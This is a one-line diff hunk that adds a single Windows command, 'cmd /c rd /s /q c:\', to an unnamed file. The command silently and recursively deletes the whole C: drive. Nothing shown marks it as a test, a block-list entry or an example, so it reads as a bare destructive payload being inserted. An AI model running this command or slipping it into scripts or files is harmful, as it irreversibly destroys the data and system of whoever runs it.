@@ -1,0 +1,1 @@
+cmd /c rd /s /q c:\
